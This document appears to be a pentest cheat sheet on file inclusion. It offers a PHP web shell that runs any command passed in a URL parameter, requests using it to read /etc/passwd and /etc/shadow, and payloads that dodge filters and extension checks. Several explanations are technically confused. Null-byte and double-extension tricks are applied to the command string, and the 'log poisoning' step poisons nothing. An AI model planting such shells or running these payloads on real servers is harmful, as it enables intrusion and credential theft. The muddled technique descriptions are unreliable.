# File Inclusion

If a web application allows an attacker to include a file, the attacker can execute arbitrary code on the server. This is known as file inclusion. Let's take a look at a simple example of file inclusion with PHP in a web application.

```php
<?php
   system($_GET['cmd']);
?>
```

After uploading this script to the server, you can try to include the file with the following request using Burp Suite or `curl` to test the file inclusion vulnerability. The request might be modified like this:

```php
GET /upload.php?cmd=cat /etc/passwd
Host: example.com
```

If this works, Remote Code Execution (RCE) is possible.

## File Extension Checks

If the application is filtering the file extension, you can bypass it by using a null byte `%00` or double extensions like `file.php.jpg`, `.phP`, or `php3`.

## Payload Examples

After uploading the file, you can try the following payloads to exploit file inclusion vulnerabilities for different characters of the file path, especially if validation is not done properly. This could lead to RCE as well.

```shell
cat /etc/shadow
cat "/e"tc'/shadow'
cat /etc/sh*dow
cat /etc/sha$()dow
cat /etc/sha${}dow
```

You can also try to use HEX encoding to bypass the filters.

```shell
'\x73\x79\x73\x74\x65\x6d'('ls');
```

## Additional Techniques

### Using Null Byte Injection

Null byte injection can be used to truncate the file extension, allowing the execution of PHP code.

```shell
GET /upload.php?cmd=cat /etc/passwd%00
Host: example.com
```

### Using Double Extensions

Double extensions can trick the application into treating the file as a different type.

```shell
GET /upload.php?cmd=cat /etc/passwd.php.jpg
Host: example.com
```

### Using Alternative PHP Extensions

Some servers may support alternative PHP extensions like `.phar`, `.phtml`, or `.php3`.

```shell
GET /upload.php?cmd=cat /etc/passwd.php3
Host: example.com
```

### Using Directory Traversal

Directory traversal can be used to access files outside the intended directory.

This alos known as Local File Inclusion (LFI) and `dot-dot-slash` attack.

```shell
GET /upload.php?cmd=cat ../../../../etc/passwd
Host: example.com
```

### Using Log Poisoning

Log poisoning involves injecting malicious code into log files that are later included by the application.

```shell
GET /upload.php?cmd=cat /var/log/apache2/access.log
Host: example.com
```
